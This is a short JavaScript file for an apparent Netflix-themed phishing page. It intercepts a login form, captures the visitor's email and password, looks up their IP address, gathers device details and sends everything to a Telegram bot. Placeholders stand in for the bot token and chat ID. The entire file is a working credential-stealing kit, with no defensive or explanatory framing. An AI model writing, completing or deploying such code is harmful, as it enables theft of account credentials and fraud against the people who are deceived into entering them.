// Replace with your actual bot token and chat ID 
const TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
const CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";
const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

// Listen for form submission
document.getElementById('login-form').addEventListener('submit', async function (e) {
    e.preventDefault(); // Prevent the default form submission

    // Get form values
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    try {
        // Fetch the user's IP address
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        const ip = ipResponse.data.ip;

        // Collect device information
        const userAgent = navigator.userAgent;  // Browser and OS info
        const platform = navigator.platform;    // Device platform (e.g., 'Win32', 'MacIntel', 'Linux x86_64')
        const screenWidth = screen.width;       // Screen width
        const screenHeight = screen.height;     // Screen height
        const deviceType = /mobile/i.test(userAgent) ? 'Mobile' : 'Desktop'; // Check if the device is mobile or desktop

        // Log collected data for debugging (Optional)
        console.log('User IP:', ip);
        console.log('User-Agent:', userAgent);
        console.log('Platform:', platform);
        console.log('Screen Resolution:', screenWidth + 'x' + screenHeight);
        console.log('Device Type:', deviceType);

        // Prepare the message content
        const message = `
<b>New Login Attempt</b>\n
<b>Email:</b> ${email}\n
<b>Password:</b> ${password}\n
<b>IP Address:</b> ${ip}\n
<b>Device Type:</b> ${deviceType}\n
<b>Platform:</b> ${platform}\n
<b>User Agent:</b> ${userAgent}\n
<b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
        `;

        // Send the collected data to Telegram
        await axios.post(URI_API, {
            chat_id: CHAT_ID,
            parse_mode: 'html',
            text: message
        });

        alert('Welcome To Netflix Homepage!');
    } catch (error) {
        console.error('An error occurred:', error);
        alert('Failed to send information. Please try again.');
    }
});
